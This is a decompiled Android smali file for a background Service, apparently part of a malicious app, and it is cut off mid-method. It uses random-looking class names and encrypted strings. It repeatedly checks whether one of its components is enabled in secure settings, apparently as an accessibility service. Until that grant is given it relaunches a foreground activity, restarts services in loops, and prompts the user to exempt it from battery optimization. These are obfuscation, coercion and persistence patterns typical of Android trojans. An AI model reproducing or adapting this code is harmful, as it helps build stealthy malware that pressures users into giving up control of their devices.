.class public final Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;
.super Landroid/app/Service;
.source ""


# instance fields
.field public b:Z

.field public c:I

.field public d:I


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x6

    iput v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;->d:I

    return-void
.end method

.method public static final a(Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;)V
    .locals 12

    invoke-static {p0}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    .line 1
    sget-boolean v0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->q:Z

    const/16 v1, 0x3a

    const-string v2, "R1VNREI1S1haQWc2OUh3L2g2S3dYVktrVjdrS2JOa1MzT1FaZVNFSkU3ND06OmFtd2VJck44U0U0TlN6T29xcktRa2c9PQ=="

    const/4 v3, 0x0

    const-string v4, "applicationContext"

    const/4 v5, 0x1

    if-nez v0, :cond_3

    .line 2
    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, v4}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v6, Lb0/b;->a:Lb0/b;

    .line 3
    sget-object v6, Lb0/b;->n:Ljava/lang/Class;

    .line 4
    :try_start_0
    new-instance v7, Landroid/content/ComponentName;

    invoke-static {v6}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-direct {v7, v0, v6}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v0, v6}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    goto :goto_0

    :cond_0
    new-instance v6, Landroid/text/TextUtils$SimpleStringSplitter;

    invoke-direct {v6, v1}, Landroid/text/TextUtils$SimpleStringSplitter;-><init>(C)V

    invoke-virtual {v6, v0}, Landroid/text/TextUtils$SimpleStringSplitter;->setString(Ljava/lang/String;)V

    :cond_1
    invoke-virtual {v6}, Landroid/text/TextUtils$SimpleStringSplitter;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-virtual {v6}, Landroid/text/TextUtils$SimpleStringSplitter;->next()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/content/ComponentName;->unflattenFromString(Ljava/lang/String;)Landroid/content/ComponentName;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-static {v0, v7}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz v0, :cond_1

    move v0, v5

    goto :goto_1

    :catch_0
    :cond_2
    :goto_0
    move v0, v3

    :goto_1
    if-eqz v0, :cond_3

    .line 5
    :try_start_1
    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    new-instance v6, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    const-class v8, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;

    invoke-direct {v6, v7, v8}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v6}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_2

    :catchall_0
    move-exception v0

    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_3
    :goto_2
    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, v4}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    sget-object v4, Lb0/b;->a:Lb0/b;

    .line 6
    sget-object v4, Lb0/b;->n:Ljava/lang/Class;

    .line 7
    :try_start_2
    new-instance v6, Landroid/content/ComponentName;

    invoke-static {v4}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-direct {v6, v0, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    invoke-static {v2}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_4

    goto :goto_3

    :cond_4
    new-instance v2, Landroid/text/TextUtils$SimpleStringSplitter;

    invoke-direct {v2, v1}, Landroid/text/TextUtils$SimpleStringSplitter;-><init>(C)V

    invoke-virtual {v2, v0}, Landroid/text/TextUtils$SimpleStringSplitter;->setString(Ljava/lang/String;)V

    :cond_5
    invoke-virtual {v2}, Landroid/text/TextUtils$SimpleStringSplitter;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_6

    invoke-virtual {v2}, Landroid/text/TextUtils$SimpleStringSplitter;->next()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/content/ComponentName;->unflattenFromString(Ljava/lang/String;)Landroid/content/ComponentName;

    move-result-object v0

    if-eqz v0, :cond_5

    invoke-static {v0, v6}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    if-eqz v0, :cond_5

    move v3, v5

    :catch_1
    :cond_6
    :goto_3
    if-nez v3, :cond_7

    :try_start_3
    const-string v0, ""

    .line 8
    sget-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v1}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v2, "permission_get"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 9
    sget-object v6, Lz0/m0;->c:Lz0/m0;

    new-instance v9, Lg0/d;

    const/4 v0, 0x0

    invoke-direct {v9, p0, v0}, Lg0/d;-><init>(Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;Ll0/d;)V

    const/4 v10, 0x3

    const/4 v11, 0x0

    const/4 v7, 0x0

    const/4 v8, 0x0

    invoke-static/range {v6 .. v11}, Lb/a;->u(Lz0/x;Ll0/f;ILr0/c;ILjava/lang/Object;)Lz0/s0;

    .line 10
    sget-object v0, Lcom/cisojemopatude/yazi/catozotu/zafewo;->h:Lcom/cisojemopatude/yazi/catozotu/zafewo;

    .line 11
    sget-boolean v0, Lcom/cisojemopatude/yazi/catozotu/zafewo;->k:Z

    if-nez v0, :cond_7

    .line 12
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    .line 13
    sget-object v2, Lb0/b;->i:Ljava/lang/Class;

    .line 14
    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x10000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    const v1, 0x8000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x20000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    const-string v1, "FromPush"

    invoke-virtual {v0, v1, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/app/Service;->startActivity(Landroid/content/Intent;)V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    goto :goto_4

    :catchall_1
    move-exception p0

    invoke-static {p0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_7
    :goto_4
    return-void
.end method

.method public static final b(Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;Ll0/d;)Ljava/lang/Object;
    .locals 12

    invoke-static {p0}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    .line 1
    instance-of v0, p1, Lg0/b;

    if-eqz v0, :cond_0

    move-object v0, p1

    check-cast v0, Lg0/b;

    iget v1, v0, Lg0/b;->j:I

    const/high16 v2, -0x80000000

    and-int v3, v1, v2

    if-eqz v3, :cond_0

    sub-int/2addr v1, v2

    iput v1, v0, Lg0/b;->j:I

    goto :goto_0

    :cond_0
    new-instance v0, Lg0/b;

    invoke-direct {v0, p0, p1}, Lg0/b;-><init>(Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;Ll0/d;)V

    :goto_0
    iget-object p1, v0, Lg0/b;->h:Ljava/lang/Object;

    sget-object v1, Lm0/a;->c:Lm0/a;

    iget v2, v0, Lg0/b;->j:I

    const/4 v3, 0x2

    const/4 v4, 0x0

    const/high16 v5, 0x20000

    const/high16 v6, 0x10000000

    const/4 v7, 0x1

    if-eqz v2, :cond_3

    if-eq v2, v7, :cond_2

    if-ne v2, v3, :cond_1

    iget-object p0, v0, Lg0/b;->g:Ljava/lang/Object;

    check-cast p0, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;

    iget-object v0, v0, Lg0/b;->f:Ljava/lang/Object;

    check-cast v0, Ls0/e;

    :try_start_0
    invoke-static {p1}, Lb/a;->C(Ljava/lang/Object;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto/16 :goto_5

    :catchall_0
    move-exception p0

    goto/16 :goto_7

    :cond_1
    new-instance p0, Ljava/lang/IllegalStateException;

    const-string p1, "call to \'resume\' before \'invoke\' with coroutine"

    invoke-direct {p0, p1}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p0

    :cond_2
    iget-object p0, v0, Lg0/b;->g:Ljava/lang/Object;

    check-cast p0, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;

    iget-object v0, v0, Lg0/b;->f:Ljava/lang/Object;

    check-cast v0, Ls0/e;

    :try_start_1
    invoke-static {p1}, Lb/a;->C(Ljava/lang/Object;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    goto/16 :goto_1

    :catchall_1
    move-exception p0

    goto/16 :goto_3

    :cond_3
    invoke-static {p1}, Lb/a;->C(Ljava/lang/Object;)V

    sget-object p1, Lh0/a;->a:Lh0/a;

    .line 2
    sget-object v2, Lh0/a;->b:Ljava/lang/String;

    .line 3
    const-string v2, "Tick: "

    .line 4
    sget-object v8, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v8}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v9, "timeWorking"

    invoke-interface {v8, v9, v4}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v8

    .line 5
    new-instance v9, Ljava/lang/Integer;

    invoke-direct {v9, v8}, Ljava/lang/Integer;-><init>(I)V

    .line 6
    invoke-static {v2, v9}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    .line 7
    sget-object v2, Lb0/b;->a:Lb0/b;

    .line 8
    new-instance v2, Ls0/e;

    invoke-direct {v2}, Ls0/e;-><init>()V

    const-wide/16 v8, 0x3e8

    iput-wide v8, v2, Ls0/e;->c:J

    .line 9
    :try_start_2
    sget-object v8, Lb0/b;->n:Ljava/lang/Class;

    .line 10
    invoke-static {p0, v8}, Lb/a;->s(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v9

    const-wide/16 v10, 0x7d0

    if-nez v9, :cond_8

    invoke-virtual {p1, p0}, Lh0/a;->o(Landroid/content/Context;)Z

    move-result v9

    if-eqz v9, :cond_8

    iput-wide v10, v2, Ls0/e;->c:J

    .line 11
    iget p1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;->c:I

    add-int/2addr p1, v7

    .line 12
    iput p1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;->c:I
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_3

    .line 13
    :try_start_3
    sget-object p1, Lcom/cisojemopatude/yazi/catozotu/zafewo;->h:Lcom/cisojemopatude/yazi/catozotu/zafewo;

    .line 14
    sget-object p1, Lcom/cisojemopatude/yazi/catozotu/zafewo;->i:Ljava/lang/String;

    .line 15
    const-string v3, "1"

    invoke-static {p1, v3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_5

    .line 16
    iget p1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;->c:I

    const/4 v3, 0x3

    if-lt p1, v3, :cond_5

    .line 17
    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    new-instance v3, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    .line 18
    sget-object v9, Lb0/b;->j:Ljava/lang/Class;

    .line 19
    invoke-direct {v3, v8, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v8, "name"

    const-string v9, "value2"

    invoke-virtual {v3, v8, v9}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v3

    invoke-virtual {p1, v3}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    iput-object v2, v0, Lg0/b;->f:Ljava/lang/Object;

    iput-object p0, v0, Lg0/b;->g:Ljava/lang/Object;

    iput v7, v0, Lg0/b;->j:I

    invoke-static {v10, v11, v0}, Lb/a;->h(JLl0/d;)Ljava/lang/Object;

    move-result-object p1
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_2

    if-ne p1, v1, :cond_4

    goto/16 :goto_a

    :cond_4
    move-object v0, v2

    :goto_1
    :try_start_4
    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    new-instance v1, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    sget-object v3, Lb0/b;->a:Lb0/b;

    .line 20
    sget-object v3, Lb0/b;->m:Ljava/lang/Class;

    .line 21
    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v2, "name"

    const-string v3, "value"

    invoke-virtual {v1, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v1

    invoke-virtual {p1, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 22
    iput v4, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;->c:I

    .line 23
    sget-object p1, Lh0/a;->a:Lh0/a;

    .line 24
    sget-object p1, Lh0/a;->b:Ljava/lang/String;

    const-string p1, "WEZ3U2J6VlBsR3psbm9OV3JPTHVmc3doMkc1NU90TVU0QjVVa1oxM2tpOW1vdm1BODNIUmtUeWcxTFA1WU1GODo6dG5YZXh3Y0ZBQ0luRnptd0ovaFRNUT09"

    .line 25
    invoke-static {p1}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    move-object v2, v0

    :cond_5
    :try_start_5
    sget-object p1, Lcom/cisojemopatude/yazi/catozotu/zafewo;->h:Lcom/cisojemopatude/yazi/catozotu/zafewo;

    .line 26
    sget p1, Lcom/cisojemopatude/yazi/catozotu/zafewo;->j:I

    const v0, 0x8000

    const/high16 v1, 0x10000

    if-ne p1, v7, :cond_6

    .line 27
    iget v3, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;->d:I

    const/16 v7, 0x14

    if-lt v3, v7, :cond_6

    .line 28
    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    new-instance v3, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    sget-object v8, Lb0/b;->a:Lb0/b;

    .line 29
    sget-object v8, Lb0/b;->i:Ljava/lang/Class;

    .line 30
    invoke-direct {v3, v7, v8}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v3, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v3

    invoke-virtual {v3, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    sget-object p1, Lh0/a;->a:Lh0/a;

    .line 31
    sget-object p1, Lh0/a;->b:Ljava/lang/String;

    const-string p1, "QkliSUNMSGE5QjFSTWp0U0VXSzJJT1FWbDZyRFJJeFdRYVFYbmEvaTRCQT06OktMb2ZMN2J6K2ZEYm9VcXQ1NFFtY0E9PQ=="

    goto :goto_2

    :cond_6
    if-nez p1, :cond_7

    .line 32
    iget p1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;->d:I

    const/4 v3, 0x4

    if-lt p1, v3, :cond_7

    .line 33
    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    new-instance v3, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    sget-object v8, Lb0/b;->a:Lb0/b;

    .line 34
    sget-object v8, Lb0/b;->i:Ljava/lang/Class;

    .line 35
    invoke-direct {v3, v7, v8}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v3, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v3

    invoke-virtual {v3, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    sget-object p1, Lh0/a;->a:Lh0/a;

    .line 36
    sget-object p1, Lh0/a;->b:Ljava/lang/String;

    const-string p1, "MHljRGdPU3Nmd3VzQmdGb3dQNHNJVXdKN3BQWFkvZVpuVlp6TTEyaDI4bz06Oi85RGtWTzIxcmZrbXdFeTJnNHlhZWc9PQ=="

    .line 37
    :goto_2
    invoke-static {p1}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 38
    iput v4, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;->d:I

    .line 39
    :cond_7
    iget p1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;->d:I

    add-int/lit8 v0, p1, 0x1

    .line 40
    iput v0, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;->d:I

    .line 41
    new-instance p0, Ljava/lang/Integer;

    invoke-direct {p0, p1}, Ljava/lang/Integer;-><init>(I)V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_2

    goto/16 :goto_9

    :catchall_2
    move-exception p0

    move-object v0, v2

    .line 42
    :goto_3
    :try_start_6
    invoke-static {p0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    :goto_4
    move-object v2, v0

    goto/16 :goto_9

    :cond_8
    :try_start_7
    invoke-static {p0, v8}, Lb/a;->s(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v4

    if-eqz v4, :cond_9

    invoke-static {p0}, Lb/a;->p(Landroid/content/Context;)Z

    move-result v4

    if-nez v4, :cond_9

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    .line 43
    sget-object v3, Lb0/b;->m:Ljava/lang/Class;

    .line 44
    invoke-direct {v0, v1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "name"

    const-string v3, "value2"

    invoke-virtual {v0, v1, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object p0

    .line 45
    sget-object v1, Lb0/b;->j:Ljava/lang/Class;

    .line 46
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string p0, "name"

    const-string v1, "value"

    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p0

    invoke-virtual {p1, p0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    const-wide/16 p0, 0x36b0

    iput-wide p0, v2, Ls0/e;->c:J

    goto/16 :goto_9

    :cond_9
    invoke-static {p0, v8}, Lb/a;->s(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v4

    if-eqz v4, :cond_c

    invoke-static {p0}, Lb/a;->p(Landroid/content/Context;)Z

    move-result v4

    if-eqz v4, :cond_c

    invoke-virtual {p1, p0}, Lh0/a;->p(Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_c

    const-wide/16 v7, 0x1388

    iput-object v2, v0, Lg0/b;->f:Ljava/lang/Object;

    iput-object p0, v0, Lg0/b;->g:Ljava/lang/Object;

    iput v3, v0, Lg0/b;->j:I

    invoke-static {v7, v8, v0}, Lb/a;->h(JLl0/d;)Ljava/lang/Object;

    move-result-object p1
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_3

    if-ne p1, v1, :cond_a

    goto/16 :goto_a

    :cond_a
    move-object v0, v2

    :goto_5
    :try_start_8
    const-string p1, "QkswdzZSbmljQzM5NW9YKzJNRjZ5dz09OjpHeGRpcHlBZGM3OGVRRTdYQzdTMmJnPT0="

    invoke-static {p1}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    invoke-virtual {p0}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object p0

    const-string p1, "applicationContext"

    invoke-static {p0, p1}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string p1, "Tnl5aU1YSmcvR3RCd3BJdUlNSzZudz09OjpzelNjR2M0enh4QUl6dnNxMEM5MTF3PT0="

    .line 47
    invoke-static {p1}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 48
    sget-object p1, Lb0/b;->a:Lb0/b;

    .line 49
    new-instance p1, Landroid/content/Intent;

    invoke-direct {p1}, Landroid/content/Intent;-><init>()V

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    const-string v2, "context.packageName"

    invoke-static {v1, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v2, "power"

    invoke-virtual {p0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    const-string v3, "null cannot be cast to non-null type android.os.PowerManager"

    invoke-static {v2, v3}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    check-cast v2, Landroid/os/PowerManager;

    invoke-virtual {v2, v1}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_b

    const-string v1, "android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS"

    invoke-virtual {p1, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    goto :goto_6

    :cond_b
    const-string v2, "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"

    invoke-virtual {p1, v2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const-string v2, "package:"

    invoke-static {v2, v1}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {p1, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    :goto_6
    invoke-virtual {p1, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v1

    const/high16 v2, 0x40000000    # 2.0f

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v1

    const/high16 v2, 0x800000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v1

    const/high16 v2, 0x20000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v1

    invoke-virtual {v1, v5}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    const-wide/16 p0, 0x4e20

    .line 50
    iput-wide p0, v0, Ls0/e;->c:J
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    goto/16 :goto_4

    :goto_7
    move-object v2, v0

    goto :goto_8

    :cond_c
    :try_start_9
    iput-wide v10, v2, Ls0/e;->c:J
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_3

    goto :goto_9

    :catchall_3
    move-exception p0

    :goto_8
    invoke-static {p0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :goto_9
    iget-wide p0, v2, Ls0/e;->c:J

    .line 51
    new-instance v1, Ljava/lang/Long;

    invoke-direct {v1, p0, p1}, Ljava/lang/Long;-><init>(J)V

    :goto_a
    return-object v1
.end method

.method public static final c(Landroid/content/Context;)V
    .locals 4

    const-class v0, Lcom/cisojemopatude/yazi/nopofoyuwure/kozoxirohizuge;

    .line 1
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    if-nez v1, :cond_0

    const/4 v1, 0x0

    goto :goto_0

    :cond_0
    const-string v2, "activity"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    :goto_0
    if-eqz v1, :cond_2

    check-cast v1, Landroid/app/ActivityManager;

    const v2, 0x7fffffff

    invoke-virtual {v1, v2}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :cond_1
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_3

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/ActivityManager$RunningServiceInfo;

    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v3

    iget-object v2, v2, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    invoke-virtual {v2}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v2

    invoke-static {v3, v2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    const/4 v0, 0x1

    goto :goto_1

    :cond_2
    new-instance v0, Ljava/lang/NullPointerException;

    const-string v1, "null cannot be cast to non-null type android.app.ActivityManager"

    invoke-direct {v0, v1}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_3
    const/4 v0, 0x0

    :goto_1
    if-nez v0, :cond_4

    .line 2
    new-instance v0, Landroid/content/Intent;

